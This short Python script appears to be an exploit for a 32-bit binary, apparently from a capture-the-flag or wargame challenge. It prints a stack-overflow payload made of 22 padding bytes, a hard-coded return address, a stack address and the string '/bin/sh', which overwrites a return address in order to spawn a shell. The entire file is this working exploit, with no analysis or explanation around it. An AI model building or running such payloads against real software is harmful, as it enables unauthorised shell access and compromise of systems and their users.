import sys

sys.stdout.buffer.write(b'a'*22 + b'\x72' + b'\x9b' + b'\x04' + b'\x08' + b'\x94' + b'\x9b' + b'\xfe' + b'\xbf' + b"/bin/sh")
